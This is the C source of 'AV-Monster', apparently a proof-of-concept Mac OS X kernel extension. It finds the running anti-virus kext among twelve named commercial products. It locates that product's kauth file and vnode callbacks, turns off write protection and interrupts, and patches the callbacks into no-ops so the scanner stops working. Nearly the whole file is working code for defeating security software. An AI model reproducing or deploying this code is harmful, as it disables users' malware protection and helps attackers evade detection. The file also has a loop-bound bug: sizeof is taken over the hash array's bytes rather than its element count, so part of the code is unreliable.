/*
 *
 *  _______         __    __          ___ ___  __                     
 * |   _   |.-----.|  |_ |__| ______ |   Y   ||__|.----..--.--..-----.
 * |.  1   ||     ||   _||  ||______||.  |   ||  ||   _||  |  ||__ --|
 * |.  _   ||__|__||____||__|        |.  |   ||__||__|  |_____||_____|
 * |:  |   |                         |:  1   |                        
 * |::.|:. |                          \:.. ./                         
 * `--- ---'                           `---'                          
 * 
 *  ___ ___                       __                
 * |   Y   |.-----..-----..-----.|  |_ .-----..----.
 * |.      ||  _  ||     ||__ --||   _||  -__||   _|
 * |. \_/  ||_____||__|__||_____||____||_____||__|  
 * |:  |   |                                        
 * |::.|:. |                                        
 * `--- ---'   v0.2
 *
 * (c) 2011,2012, fG! <reverser@put.as> http://reverse.put.as
 *
 *
 * This will disable all anti-virus in Mac OS X
 * The trick is to remove the kauth callbacks from each kernel module
 * Anti-virus do not check for the integrity of this and we can even
 * patch directly into the disk (no own file checksums!)
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "av-monster.h"

#define VERSION "0.2"

// address reported by kextstat, we need to add 0x1000 to that address
//#define BASEADDRESS 0x22bc9000 + 0x1000

// variables
uint32_t original_fileop1       = 0;
uint32_t original_fileop2       = 0;
uint32_t original_vnode1        = 0;
uint32_t original_vnode2        = 0;
uint32_t fileopListenerAddress  = 1;
uint32_t vnodeListenerAddress   = 1;
uint8_t  isKernelPatched        = 0;

/* 
 * these are the hashes for the supported AV
 * it's the kernel extension name as given by kextstat and registered in
 * the kmod_info_t structure
 * hash algo is FNV1A_Hash_Jesteress from:
 * http://encode.ru/threads/1160-Fastest-non-secure-hash-function
 */ 
uint32_t nameHashes[] = { 0x3a33eb5f, // com.intego.iokit.VirusBarrierX6Service - Intego
                          0xe1fc8f26, // com.avast.AvastFileShield - Avast
                          0x6b2e99dd, // com.comodo.kext.FileAccessFilter - Comodo
                          0xbb60be68, // com.eset.kext.esets_kac - Eset
                          0xeaa35a44, // com.f-secure.kext.fsauth - F-secure
                          0xf650927e, // com.kaspersky.kext.klif - Kaspersky
                          0x37f4c1f5, // com.mcafee.kext.Virex and - Mcafee
                                      // com.McAfee.kext.AppProtection - TODO
                          0x547c4aa0, // com.pandasecurity.iokit.FileInterceptor - Panda
                          0xbcb5b39e, // com.sophos.kext.sav - Sophos
                          0xb584a931, // com.drweb.DrWeb4MacMonitor - Dr Web
                          0x3bbb6053, // com.Bitdefender.iokit.av - Bit Defender
                          0xe2985543  // com.zeobit.kext.AVKauth - Mac Keeper
                        };

/*
 * find which anti-virus is currently installed and running
 */
kmod_info_t* 
find_av_module(kmod_info_t *ki)
{
    kmod_info_t *kmod = ki;
    uint32_t kmodNameHash = 0;
    uint32_t nameHashesLength = sizeof(nameHashes);
    
    // iterate and search anti-virus kernel modules
    while (kmod->next != NULL)
    {
        kmodNameHash = FNV1A_Hash_Jesteress(kmod->name, KMOD_MAX_NAME);
        uint32_t x = 0;
        for (; x < nameHashesLength; x++)
        {
            if ((uint32_t)nameHashes[x] == kmodNameHash)
            {
#if DEBUG
                printf("[DEBUG] Found av kernel module: %s at address %x\n", kmod->name, kmod->address);
#endif
                return(kmod);
            }
        }
        kmod = kmod->next;
    }
    return NULL;
}

/*
 * THE FUN STARTS HERE
 */
kern_return_t 
av_monster_start (kmod_info_t * ki, void * d) 
{
    // get a copy of the kmod_info_t
    // ki points to the head of the linked list kmod, where we can retrieve the kernel mods list
    kmod_info_t *target_kmod = find_av_module(ki);
    
    // if it's NULL, fail gracefully aka do nothing
    if (target_kmod == NULL) 
    {
#if DEBUG
        printf("[DEBUG] %s failed target_kmod!\n", __FUNCTION__);
        return KERN_FAILURE;
#else        
        return KERN_SUCCESS;   
#endif
    }
    
    /*
     * now we can process the target kmod headers and start searching for the 
     * stuff we want to patch
     * a good way to find the callbacks is to search for com.apple.kauth.fileop 
     * and com.apple.kauth.vnode strings
     * they are used in kauth_listen_scope, which has the callback as the 2nd
     * parameter
     */
    struct header_info headerInfo;
    // get location/info of __cstring and __text sections
    if (process_header(target_kmod->address, &headerInfo))
    {
#if DEBUG
        printf("[DEBUG] %s Failed! process header\n", __FUNCTION__);
        return KERN_FAILURE;
#else
        return KERN_SUCCESS;
#endif
    }
    // get address of the strings so we can search references to them
    // strings to match:
    // com.apple.kauth.fileop
    // com.apple.kauth.vnode
    const char *fileopString = "com.apple.kauth.fileop";
    const char *vnodeString  = "com.apple.kauth.vnode";
    uint32_t fileopStringAddress = find_strings(&headerInfo, fileopString, strlen(fileopString)+1);
    uint32_t vnodeStringAddress  = find_strings(&headerInfo, vnodeString, strlen(vnodeString)+1);
    
    /*
     __text:000014F1 C7 44 24 04 7C 28 00 00   mov     dword ptr [esp+4], offset _VNodeListener
     __text:000014F9 C7 04 24 E8 3A 00 00      mov     dword ptr [esp], offset aCom_apple_kaut ; "com.apple.kauth.vnode"
     __text:00001500 E8 53 38 00 00            call    near ptr _kauth_listen_scope
     */
    
    if (fileopStringAddress != 1)
    {
#if DEBUG
        printf("[DEBUG] Searching for fileop listener address\n");
#endif
        fileopListenerAddress = find_install_scope(target_kmod, fileopStringAddress, &headerInfo);
    }
    if (vnodeStringAddress != 1)
    {
#if DEBUG
        printf("[DEBUG] searching for vnode listener address\n");
#endif
        vnodeListenerAddress = find_install_scope(target_kmod, vnodeStringAddress, &headerInfo);
    }
    
	// grab original bytes
    if (fileopListenerAddress != 1)
    {
#if DEBUG
        printf("[DEBUG] Copying fileop original bytes\n");
#endif
        original_fileop1 = *(uint32_t*)(fileopListenerAddress);
        original_fileop2 = *(uint32_t*)(fileopListenerAddress+4);
    }
    if (vnodeListenerAddress != 1)
    {
#if DEBUG
        printf("[DEBUG] Copying vnode original bytes\n");
#endif
        original_vnode1 = *(uint32_t*)(vnodeListenerAddress);
        original_vnode2 = *(uint32_t*)(vnodeListenerAddress+4);
    }

	// patch bytes
	if(verify_writeprotection() == 0)
    {
        disable_writeprotection();
        // put error condition here in case it fails
#if DEBUG
        return KERN_FAILURE;
#else
        return KERN_SUCCESS;
#endif
    }

    disable_interrupts();
    
	// start patching
#if DEBUG
    printf("[DEBUG] Patching callbacks...\n");
#endif
    
    if (fileopListenerAddress != 1)
    {   
        *(uint32_t*)(fileopListenerAddress)     = 0x000003b8;
        *(uint32_t*)(fileopListenerAddress+4)   = 0x9090c300;
    }
    if (vnodeListenerAddress != 1)
    {
        *(uint32_t*)(vnodeListenerAddress)      = 0x000003b8;
        *(uint32_t*)(vnodeListenerAddress+4)    = 0x9090c300;
    }

    enable_interrupts();
    enable_writeprotection();	
	// ALL DONE
    isKernelPatched = 1;
	return KERN_SUCCESS;
}


/*
 * THE FUN ENDS HERE :-(
 */
kern_return_t 
av_monster_stop (kmod_info_t * ki, void * d) 
{
#if DEBUG
	printf("[DEBUG] Start unpatching ...\n");
#endif
    
    if (isKernelPatched)
    {
        disable_interrupts();

        // patch bytes
        if(verify_writeprotection() == 0)
        {
            disable_writeprotection();
            // put error condition here in case it fails
#if DEBUG
            return KERN_FAILURE;
#else
            return KERN_SUCCESS;
#endif
        }

        if (fileopListenerAddress != 1)
        {
            *(uint32_t*)(fileopListenerAddress)     = original_fileop1;
            *(uint32_t*)(fileopListenerAddress+4)   = original_fileop2;
        }
        if (vnodeListenerAddress != 1)
        {
            *(uint32_t*)(vnodeListenerAddress)      = original_vnode1;
            *(uint32_t*)(vnodeListenerAddress+4)    = original_vnode2;
        }

        enable_interrupts();
        enable_writeprotection();	
    }
	
    // ALL DONE
	return KERN_SUCCESS;
}

